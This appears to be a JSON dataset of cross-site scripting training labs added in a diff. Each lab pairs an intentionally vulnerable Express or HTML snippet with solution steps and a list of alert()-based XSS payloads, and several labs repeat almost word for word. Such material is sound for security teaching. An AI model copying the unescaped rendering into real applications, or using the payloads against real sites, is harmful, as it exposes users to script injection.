@@ -1,0 +1,453 @@
+[
+    {
+      "Lab scenario": "Reflected XSS in Search Query Parameter",
+      "Lab Description": "The application provides a search feature where user input is reflected back into the page without proper sanitization. Attackers can inject scripts through the search parameter to achieve XSS.\nTo solve: Craft a malicious payload in the search query and observe if it executes on the response page.",
+      "Difficulty Level": "Easy",
+      "Solution Steps": [
+        "Navigate to the search page and observe the URL format: /search?q=term",
+        "Inject a payload such as <script>alert(1)</script> in the q parameter",
+        "Reload the page and check if the script executes",
+        "Try alternate payloads like <img src=x onerror=alert(1)> or <svg/onload=alert(1)>"
+      ],
+      "payloads": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>",
+        "\"><script>alert(1)</script>"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const query = req.query.q || '';\n  res.send(`\n    <html>\n      <body>\n        <h2>Search Results for: ${query}</h2>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running'));\n"
+    },
+    {
+      "Lab scenario": "Stored XSS in Product Review System",
+      "Lab Description": "Users can leave reviews on product pages. The application does not sanitize or escape the user-submitted content before rendering it, leading to stored XSS.\nTo solve: Submit a malicious script in the review form and revisit the product page to confirm execution.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Go to a product page and submit a new review with a script payload",
+        "Use <script>alert('XSS')</script> or similar",
+        "Reload the product page and see if the script executes",
+        "Try different vectors such as <img src=x onerror=alert(1)>"
+      ],
+      "payloads": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(1)>",
+        "<iframe src='javascript:alert(1)'></iframe>",
+        "<svg/onload=alert(1)>"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet reviews = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/product', (req, res) => {\n  const reviewHtml = reviews.map(r => `<p>${r}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Product Page</h2>\n        ${reviewHtml}\n        <form action='/review' method='POST'>\n          <textarea name='comment'></textarea>\n          <button type='submit'>Submit Review</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/review', (req, res) => {\n  reviews.push(req.body.comment);\n  res.redirect('/product');\n});\n\napp.listen(3000, () => console.log('Running on port 3000'));\n"
+    },
+    {
+      "Lab scenario": "DOM-based XSS in Location Hash",
+      "Lab Description": "The application uses `location.hash` to dynamically update content on the page without sanitization. This allows attackers to inject scripts that execute when the hash is processed.\nTo solve: Inject a script payload into the URL hash and observe its execution in the page.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Navigate to /dom-xss.html#<payload>",
+        "Observe the innerHTML sink updating the page using the hash value",
+        "Use a payload like #<img src=x onerror=alert(1)>",
+        "Confirm that the script executes upon loading"
+      ],
+      "payloads": [
+        "<img src=x onerror=alert(1)>",
+        "<script>alert(1)</script>",
+        "<svg/onload=alert(1)>",
+        "<iframe src='javascript:alert(1)'></iframe>"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "srcCode": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.use(express.static(path.join(__dirname, 'public')));\n\napp.listen(3000, () => console.log('DOM XSS Lab running'));\n\n// public/dom-xss.html\n// <html>\n//   <body>\n//     <h2>Welcome</h2>\n//     <div id=\"output\"></div>\n//     <script>\n//       document.getElementById('output').innerHTML = location.hash.substring(1);\n//     </script>\n//   </body>\n// </html>\n"
+    },
+    {
+      "Lab scenario": "Stored XSS in User Profile Bio",
+      "Lab Description": "Users can update their profile bio. The application displays this information without escaping HTML content, leading to persistent XSS on profile pages.\nTo solve: Insert a payload in the bio field and revisit your profile page.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Navigate to the profile settings page",
+        "Update the bio field with <script>alert('bio')</script>",
+        "Save the profile and revisit the profile page",
+        "Observe execution of the script"
+      ],
+      "payloads": [
+        "<script>alert('bio')</script>",
+        "<img src=x onerror=alert('bio')>",
+        "<svg/onload=alert('bio')>",
+        "<iframe src='javascript:alert(\"bio\")'></iframe>"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userProfile = { bio: 'This is my bio.' };\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/profile', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>User Profile</h2>\n        <p>${userProfile.bio}</p>\n        <form action='/update-bio' method='POST'>\n          <textarea name='bio'></textarea>\n          <button type='submit'>Update Bio</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/update-bio', (req, res) => {\n  userProfile.bio = req.body.bio;\n  res.redirect('/profile');\n});\n\napp.listen(3000, () => console.log('Profile XSS running'));\n"
+    },
+    {
+      "Lab scenario": "XSS via JavaScript URL in HREF Attribute",
+      "Lab Description": "The application includes user-controlled links using anchor tags where the href is directly set to user input. This allows attackers to inject `javascript:` URLs to execute code when the link is clicked.\nTo solve: Inject a `javascript:` payload and click the link to confirm execution.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Visit the vulnerable page that displays user-submitted links",
+        "Submit a malicious link with href=javascript:alert(1)",
+        "Click on the rendered link to trigger the payload",
+        "Try alternate payloads with encoding to bypass filters"
+      ],
+      "payloads": [
+        "javascript:alert(1)",
+        "JaVaScRiPt:alert(1)",
+        "javascript:confirm(1)",
+        "data:text/html,<script>alert('XSS')</script>"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userLink = '#';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/link', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Your Custom Link</h2>\n        <a href=\"${userLink}\">Click Me</a>\n        <form action='/link-update' method='POST'>\n          <input name='url' placeholder='Enter a URL'>\n          <button type='submit'>Submit</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/link-update', (req, res) => {\n  userLink = req.body.url;\n  res.redirect('/link');\n});\n\napp.listen(3000, () => console.log('JavaScript URI XSS lab running'));\n"
+    },
+    {
+        "Lab scenario": "XSS in Client-Side Comment Preview Feature",
+        "Lab Description": "The application has a live comment preview implemented entirely on the client-side. User input is inserted into the DOM using `innerHTML` without sanitization, allowing for DOM-based XSS.\nTo solve: Inject a payload in the comment box and observe the live preview triggering script execution.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+            "Open the comment section with live preview enabled",
+            "Type an XSS payload like <img src=x onerror=alert(1)>",
+            "Observe if it executes in the preview panel",
+            "Try variations using <svg>, <script>, or <iframe>"
+        ],
+        "payloads": [
+            "<img src=x onerror=alert(1)>",
+            "<script>alert('preview')</script>",
+            "<svg/onload=alert(1)>",
+            "<iframe src='javascript:alert(1)'></iframe>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.use(express.static(path.join(__dirname, 'public')));\n\napp.listen(3000, () => console.log('Preview XSS lab running'));\n\n// public/preview.html\n// <html>\n//   <body>\n//     <h2>Leave a Comment</h2>\n//     <textarea id=\"comment\"></textarea>\n//     <div id=\"preview\"></div>\n//     <script>\n//       document.getElementById('comment').addEventListener('input', function(e) {\n//         document.getElementById('preview').innerHTML = e.target.value;\n//       });\n//     </script>\n//   </body>\n// </html>\n"
+    },
+    {
+        "Lab scenario": "Stored XSS in Admin Feedback Viewer",
+        "Lab Description": "Users can submit feedback via a contact form. The feedback is stored and later viewed by an admin. Since the admin interface renders raw HTML from stored feedback, it's vulnerable to stored XSS.\nTo solve: Submit a feedback with a payload and wait for the admin to view it.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+            "Submit a feedback message like <script>alert('admin')</script>",
+            "Access the admin interface to view submitted feedback",
+            "Observe if the script executes when admin opens the page",
+            "Confirm it’s stored and triggered only on admin-side"
+        ],
+        "payloads": [
+            "<script>alert('admin')</script>",
+            "<img src=x onerror=alert('admin')>",
+            "<svg/onload=alert('admin')>",
+            "<iframe src='javascript:alert(1)'></iframe>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet feedbacks = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/contact', (req, res) => {\n  res.send(`\n    <form action='/submit-feedback' method='POST'>\n      <textarea name='msg'></textarea>\n      <button type='submit'>Send</button>\n    </form>\n  `);\n});\n\napp.post('/submit-feedback', (req, res) => {\n  feedbacks.push(req.body.msg);\n  res.redirect('/contact');\n});\n\napp.get('/admin/feedbacks', (req, res) => {\n  const allFeedback = feedbacks.map(f => `<div>${f}</div>`).join('');\n  res.send(`<html><body>${allFeedback}</body></html>`);\n});\n\napp.listen(3000, () => console.log('Admin feedback lab running'));\n"
+    },
+    {
+        "Lab scenario": "XSS in Unescaped Error Message",
+        "Lab Description": "The application displays error messages using unsanitized user input. If the user submits malformed input, it is echoed in the error output, enabling reflected XSS.\nTo solve: Trigger an error that includes a payload in the message.",
+        "Difficulty Level": "Easy",
+        "Solution Steps": [
+            "Submit a request with a malformed parameter like /error?msg=<script>alert(1)</script>",
+            "Observe if the error page reflects the message unsafely",
+            "Try different payloads including <img src=x onerror=alert(1)>"
+        ],
+        "payloads": [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "<svg/onload=alert(1)>",
+            "\"><script>alert(1)</script>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/error', (req, res) => {\n  const msg = req.query.msg || 'Unknown error';\n  res.send(`<html><body><h2>Error: ${msg}</h2></body></html>`);\n});\n\napp.listen(3000, () => console.log('Error XSS lab running'));\n"
+    },
+    {
+        "Lab scenario": "DOM XSS via Unescaped URL Parameter in Template",
+        "Lab Description": "The application loads a `title` parameter from the URL and inserts it directly into a DOM template using `innerHTML`. If not escaped, this allows DOM-based XSS via the `title` parameter.\nTo solve: Inject a payload into the title parameter and confirm execution.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+            "Access /template.html?title=<img src=x onerror=alert(1)>",
+            "View how the template injects the title",
+            "Try encoded and alternate payloads to bypass filters",
+            "Observe script execution"
+        ],
+        "payloads": [
+            "<img src=x onerror=alert(1)>",
+            "<svg/onload=alert(1)>",
+            "<script>alert(1)</script>",
+            "<iframe src='javascript:alert(1)'></iframe>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.use(express.static(path.join(__dirname, 'public')));\n\napp.listen(3000, () => console.log('Template XSS lab running'));\n\n// public/template.html\n// <html>\n//   <body>\n//     <div id=\"title\"></div>\n//     <script>\n//       const params = new URLSearchParams(window.location.search);\n//       const title = params.get('title') || 'Default';\n//       document.getElementById('title').innerHTML = title;\n//     </script>\n//   </body>\n// </html>\n"
+    },
+    {
+        "Lab scenario": "XSS via File Name in File Upload Confirmation Page",
+        "Lab Description": "When users upload a file, the server reflects the original filename back into the confirmation message without sanitization. This allows attackers to upload files with malicious names containing XSS payloads.\nTo solve: Upload a file with a filename containing a script and confirm that it executes on the confirmation page.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+            "Prepare a file named <script>alert(1)</script>.txt",
+            "Upload it through the upload form",
+            "View the confirmation page showing the uploaded filename",
+            "Check if the script executes"
+        ],
+        "payloads": [
+            "<script>alert(1)</script>.txt",
+            "<img src=x onerror=alert(1)>.jpg",
+            "<svg/onload=alert(1)>.svg",
+            "\"><script>alert(1)</script>.png"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst multer = require('multer');\nconst app = express();\n\nconst storage = multer.memoryStorage();\nconst upload = multer({ storage });\n\napp.get('/upload', (req, res) => {\n  res.send(`<form action='/upload' method='POST' enctype='multipart/form-data'>\n    <input type='file' name='file'>\n    <button type='submit'>Upload</button>\n  </form>`);\n});\n\napp.post('/upload', upload.single('file'), (req, res) => {\n  const fileName = req.file.originalname;\n  res.send(`<h2>Uploaded: ${fileName}</h2>`);\n});\n\napp.listen(3000, () => console.log('File upload XSS lab running'));\n"
+    },
+    {
+        "Lab scenario": "Reflected XSS via Search Query Parameter",
+        "Lab Description": "The application has a search functionality that reflects user input directly into the results page without encoding or sanitization. An attacker can inject malicious scripts via the search query.\nTo solve: Inject a payload in the search parameter and confirm its execution in the results page.",
+        "Difficulty Level": "Easy",
+        "Solution Steps": [
+          "Navigate to /search?q=<script>alert(1)</script>",
+          "Observe if the payload is reflected on the page",
+          "Try variations with <img>, <svg> and encoded characters"
+        ],
+        "payloads": [
+          "<script>alert(1)</script>",
+          "<img src=x onerror=alert(1)>",
+          "<svg/onload=alert(1)>",
+          "<iframe src='javascript:alert(1)'></iframe>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const q = req.query.q || '';\n  res.send(`<html><body><h3>Results for: ${q}</h3></body></html>`);\n});\n\napp.listen(3000, () => console.log('Search XSS lab running'));\n"
+    },
+    {
+        "Lab scenario": "Stored XSS in User Profile Bio",
+        "Lab Description": "Users can update their profile including a 'bio' field. The bio is displayed on their public profile page without escaping HTML. An attacker can store a payload in the bio that executes whenever someone views their profile.\nTo solve: Submit a malicious bio and visit the profile to confirm execution.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Navigate to /edit-profile and input <script>alert(1)</script> in the bio field",
+          "Submit the form and go to /user/me",
+          "Observe if the script executes on the profile page"
+        ],
+        "payloads": [
+          "<script>alert(1)</script>",
+          "<img src=x onerror=alert(1)>",
+          "<svg/onload=alert(1)>",
+          "<iframe src='javascript:alert(1)'></iframe>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userBio = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/edit-profile', (req, res) => {\n  res.send(`<form method='POST' action='/update-profile'>\n    <textarea name='bio'></textarea>\n    <button type='submit'>Save</button>\n  </form>`);\n});\n\napp.post('/update-profile', (req, res) => {\n  userBio = req.body.bio;\n  res.redirect('/user/me');\n});\n\napp.get('/user/me', (req, res) => {\n  res.send(`<h3>User Profile</h3><div>${userBio}</div>`);\n});\n\napp.listen(3000, () => console.log('Profile XSS lab running'));\n"
+    },
+    {
+        "Lab scenario": "XSS in JavaScript Context via URL Parameter",
+        "Lab Description": "The page dynamically sets a JavaScript variable using a URL parameter without proper sanitization. Injecting unescaped characters allows breaking out of the script context and executing arbitrary code.\nTo solve: Inject a payload that escapes the JavaScript string and executes your code.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+          "Access /page?name=xyz and inspect the page source",
+          "Try /page?name=';alert(1)//",
+          "Observe if alert box is triggered due to injected code"
+        ],
+        "payloads": [
+          "';alert(1)//",
+          "';confirm(1)//",
+          "'-alert(1)-'",
+          "'+alert(1)+'"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/page', (req, res) => {\n  const name = req.query.name || 'Guest';\n  res.send(`\n    <html>\n      <body>\n        <script>\n          var user = '${name}';\n          document.write('Hello ' + user);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('JS Context XSS lab running'));\n"
+    },
+    {
+        "Lab scenario": "DOM XSS via Fragment Identifier Injection",
+        "Lab Description": "The page uses JavaScript to read the URL fragment (`location.hash`) and inserts it into the page using `innerHTML`. This allows attackers to craft a malicious link that executes code when opened.\nTo solve: Craft a URL with a malicious hash and verify code execution.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Open /hash.html#<img src=x onerror=alert(1)>",
+          "Observe how the page handles the hash value",
+          "Confirm if the script executes due to unsafe DOM insertion"
+        ],
+        "payloads": [
+          "#<img src=x onerror=alert(1)>",
+          "#<script>alert(1)</script>",
+          "#<svg/onload=alert(1)>",
+          "#<iframe src='javascript:alert(1)'></iframe>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "// hash.html\n<html>\n  <body>\n    <div id='output'></div>\n    <script>\n      document.getElementById('output').innerHTML = location.hash.substring(1);\n    </script>\n  </body>\n</html>\n"
+    },
+    {
+        "Lab scenario": "XSS in Product Review Rendering",
+        "Lab Description": "Users can leave reviews on products. These reviews are displayed on the product page without sanitization. Malicious users can inject HTML/JavaScript into the review content.\nTo solve: Submit a review containing a script and reload the product page.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Go to /product/1/review and submit a payload like <script>alert(1)</script>",
+          "Visit the product page /product/1 to check if it executes",
+          "Try different payloads in case of filtering"
+        ],
+        "payloads": [
+          "<script>alert(1)</script>",
+          "<img src=x onerror=alert(1)>",
+          "<svg/onload=alert(1)>",
+          "<iframe src='javascript:alert(1)'></iframe>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet reviews = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/product/1', (req, res) => {\n  const allReviews = reviews.map(r => `<p>${r}</p>`).join('');\n  res.send(`<h1>Product 1</h1>${allReviews}<a href='/product/1/review'>Leave a review</a>`);\n});\n\napp.get('/product/1/review', (req, res) => {\n  res.send(`<form method='POST'><textarea name='review'></textarea><button>Submit</button></form>`);\n});\n\napp.post('/product/1/review', (req, res) => {\n  reviews.push(req.body.review);\n  res.redirect('/product/1');\n});\n\napp.listen(3000, () => console.log('Review XSS lab running'));\n"
+    },
+    {
+        "Lab scenario": "XSS in JSON Response Rendered via innerHTML",
+        "Lab Description": "The application fetches a user profile via JSON and renders fields like 'nickname' using `innerHTML`. A malicious user can inject a script in their nickname, which is then executed when another user views the profile.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Register a new user with the nickname field set to <img src=x onerror=alert('XSS')>",
+          "Login as another user and visit the malicious user’s profile",
+          "Observe the script execution from the JSON-rendered nickname"
+        ],
+        "payloads": [
+          "<img src=x onerror=alert('XSS')>",
+          "<svg/onload=alert('XSS')>",
+          "<script>alert('XSS')</script>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "// profile.html\n<html>\n  <body>\n    <div id='nickname'></div>\n    <script>\n      fetch('/api/user/evil')\n        .then(res => res.json())\n        .then(data => {\n          document.getElementById('nickname').innerHTML = data.nickname;\n        });\n    </script>\n  </body>\n</html>\n\n// Express endpoint\nconst express = require('express');\nconst app = express();\n\napp.get('/api/user/evil', (req, res) => {\n  res.json({ nickname: \"<img src=x onerror=alert('XSS')>\" });\n});\n\napp.listen(3000, () => console.log('JSON XSS lab running'));\n"
+    },
+    {
+        "Lab scenario": "XSS in Comment Section with Markdown Parsing",
+        "Lab Description": "The app allows Markdown-formatted comments but doesn’t properly sanitize embedded HTML. Attackers can bypass Markdown rendering with raw HTML containing XSS payloads.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+          "Post a comment like <script>alert(1)</script> in Markdown input",
+          "Visit the blog page and confirm if the payload executes",
+          "Test HTML embedded inside Markdown if initial payloads are filtered"
+        ],
+        "payloads": [
+          "<script>alert(1)</script>",
+          "<img src=x onerror=alert(1)>",
+          "<iframe src='javascript:alert(1)'></iframe>",
+          "<svg/onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst marked = require('marked');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/post', (req, res) => {\n  const rendered = comments.map(c => marked(c)).join('<hr>');\n  res.send(`<h1>Blog Post</h1>${rendered}<form method='POST'><textarea name='comment'></textarea><button>Submit</button></form>`);\n});\n\napp.post('/post', (req, res) => {\n  comments.push(req.body.comment);\n  res.redirect('/post');\n});\n\napp.listen(3000, () => console.log('Markdown XSS lab running'));\n"
+    },
+    {
+        "Lab scenario": "Stored XSS in Support Ticket System",
+        "Lab Description": "Users can submit support tickets with titles and descriptions. These values are later reviewed by admins. The input is rendered without encoding, allowing attackers to inject stored XSS payloads into ticket fields.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Submit a ticket with a title or description like <img src=x onerror=alert('Admin')>",
+          "Wait or simulate an admin visiting the ticket view page",
+          "Check for XSS execution"
+        ],
+        "payloads": [
+          "<img src=x onerror=alert('Admin')>",
+          "<svg/onload=alert('XSS')>",
+          "<script>alert('Stored')</script>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet tickets = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/submit-ticket', (req, res) => {\n  res.send(`<form method='POST'>\n    <input name='title' placeholder='Title'>\n    <textarea name='desc'></textarea>\n    <button>Submit</button>\n  </form>`);\n});\n\napp.post('/submit-ticket', (req, res) => {\n  tickets.push({ title: req.body.title, desc: req.body.desc });\n  res.redirect('/admin/tickets');\n});\n\napp.get('/admin/tickets', (req, res) => {\n  const view = tickets.map(t => `<h3>${t.title}</h3><p>${t.desc}</p>`).join('<hr>');\n  res.send(`<h1>All Tickets</h1>${view}`);\n});\n\napp.listen(3000, () => console.log('Support Ticket XSS lab running'));\n"
+    },
+    {
+        "Lab scenario": "XSS via Event Handler Injection in User Settings",
+        "Lab Description": "The app displays user settings including a customizable profile badge with attributes like color and label. Input is reflected in HTML attributes without validation, allowing injection of `onmouseover`, `onclick`, etc.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+          "Go to /settings and set badge label to <div onmouseover=alert(1)>Hover me</div>",
+          "Save changes and view the badge",
+          "Hover to trigger the script"
+        ],
+        "payloads": [
+          "<div onmouseover=alert(1)>Hover me</div>",
+          "<button onclick=alert(1)>Click</button>",
+          "<img src=x onerror=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userBadge = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/settings', (req, res) => {\n  res.send(`<form method='POST'>\n    <input name='badge' placeholder='Badge HTML'>\n    <button>Save</button>\n  </form>`);\n});\n\napp.post('/settings', (req, res) => {\n  userBadge = req.body.badge;\n  res.redirect('/me');\n});\n\napp.get('/me', (req, res) => {\n  res.send(`<h1>Your Profile</h1>${userBadge}`);\n});\n\napp.listen(3000, () => console.log('Badge XSS lab running'));\n"
+    },
+    {
+        "Lab scenario": "DOM XSS in History PushState Injection",
+        "Lab Description": "The page uses `history.pushState` to change the visible URL and then updates part of the DOM using the value of `location.pathname`. An attacker can inject crafted content into the DOM by manipulating the path.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Navigate to /fakepath/<img src=x onerror=alert(1)>",
+          "Check how `innerHTML` is being updated based on `location.pathname`",
+          "Confirm XSS triggers via pathname injection"
+        ],
+        "payloads": [
+          "/<img src=x onerror=alert(1)>",
+          "/<svg/onload=alert(1)>",
+          "/<script>alert(1)</script>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "// domxss.html\n<html>\n  <body>\n    <div id='page'></div>\n    <script>\n      history.pushState({}, '', location.pathname);\n      document.getElementById('page').innerHTML = location.pathname.substring(1);\n    </script>\n  </body>\n</html>\n"
+    },
+    {
+        "Lab scenario": "Reflected XSS via Error Message Parameter",
+        "Lab Description": "The application reflects an error message from a query parameter directly into the page without sanitization. Attackers can inject JavaScript payloads through the `error` query string.",
+        "Difficulty Level": "Easy",
+        "Solution Steps": [
+          "Navigate to /login?error=<script>alert('XSS')</script>",
+          "Observe the reflected error message displayed on the page",
+          "Confirm if JavaScript executes"
+        ],
+        "payloads": [
+          "<script>alert('XSS')</script>",
+          "<img src=x onerror=alert('XSS')>",
+          "<svg/onload=alert('XSS')>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/login', (req, res) => {\n  const error = req.query.error || '';\n  res.send(`\n    <html>\n      <body>\n        <h2>Login Page</h2>\n        ${error ? `<p style='color:red'>${error}</p>` : ''}\n        <form method='POST'><input name='user'><input name='pass' type='password'><button>Login</button></form>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Reflected XSS lab running'));\n"
+    },
+    {
+        "Lab scenario": "DOM XSS via Location Hash Injection",
+        "Lab Description": "The app uses `location.hash` to dynamically insert content into the page using `innerHTML`. This allows attackers to trigger XSS by modifying the fragment identifier.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Navigate to /#<img src=x onerror=alert(1)>",
+          "Check if the fragment is parsed and rendered using innerHTML",
+          "Confirm script execution upon page load"
+        ],
+        "payloads": [
+          "#<script>alert(1)</script>",
+          "#<svg/onload=alert(1)>",
+          "#<img src=x onerror=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "<html>\n  <body>\n    <div id='output'></div>\n    <script>\n      document.getElementById('output').innerHTML = decodeURIComponent(location.hash.substring(1));\n    </script>\n  </body>\n</html>\n"
+    },
+    {
+        "Lab scenario": "XSS in Search Autocomplete Suggestions",
+        "Lab Description": "The search feature displays autocomplete suggestions fetched from the server and rendered using `innerHTML`. Malicious input from the query is reflected without sanitization.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+          "Send a request like /search?query=<img src=x onerror=alert(1)>",
+          "Observe the autocomplete box rendering the malicious query",
+          "Confirm if payload triggers execution"
+        ],
+        "payloads": [
+          "<img src=x onerror=alert(1)>",
+          "<script>alert('Autocomplete')</script>",
+          "<svg/onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const q = req.query.query || '';\n  res.send(`\n    <html>\n      <body>\n        <input value='${q}' id='searchBox'>\n        <div id='suggestions'>Suggestions for: <b>${q}</b></div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Autocomplete XSS lab running'));\n"
+    },
+    {
+        "Lab scenario": "Stored XSS in User Bio with Unsafe Render",
+        "Lab Description": "Users can set their bio on their profile. The server stores this content and later displays it without escaping or sanitizing, making it vulnerable to stored XSS.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Update your profile bio with <script>alert('bio')</script>",
+          "Visit the profile view page",
+          "Observe if the payload gets executed"
+        ],
+        "payloads": [
+          "<script>alert('bio')</script>",
+          "<img src=x onerror=alert('bio')>",
+          "<svg/onload=alert('bio')>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userBio = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/edit-bio', (req, res) => {\n  res.send(`<form method='POST'><textarea name='bio'></textarea><button>Save</button></form>`);\n});\n\napp.post('/edit-bio', (req, res) => {\n  userBio = req.body.bio;\n  res.redirect('/profile');\n});\n\napp.get('/profile', (req, res) => {\n  res.send(`<h2>User Profile</h2><p>${userBio}</p>`);\n});\n\napp.listen(3000, () => console.log('User bio XSS lab running'));\n"
+    },
+    {
+        "Lab scenario": "XSS via Unsanitized Image Caption in Gallery",
+        "Lab Description": "Users upload images with optional captions. These captions are rendered directly into the gallery view using `innerHTML`. Attackers can upload a benign image with a malicious caption.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+          "Upload an image and set the caption to <img src=x onerror=alert('caption')>",
+          "View the gallery page",
+          "Check for script execution from the caption"
+        ],
+        "payloads": [
+          "<img src=x onerror=alert('caption')>",
+          "<svg/onload=alert('caption')>",
+          "<script>alert('caption')</script>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet images = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/upload', (req, res) => {\n  res.send(`<form method='POST'>\n    <input name='url' placeholder='Image URL'>\n    <input name='caption' placeholder='Caption'>\n    <button>Upload</button>\n  </form>`);\n});\n\napp.post('/upload', (req, res) => {\n  images.push({ url: req.body.url, caption: req.body.caption });\n  res.redirect('/gallery');\n});\n\napp.get('/gallery', (req, res) => {\n  const html = images.map(img => `<div><img src='${img.url}'><p>${img.caption}</p></div>`).join('');\n  res.send(`<h1>Gallery</h1>${html}`);\n});\n\napp.listen(3000, () => console.log('Gallery XSS lab running'));\n"
+    }
+]
+  
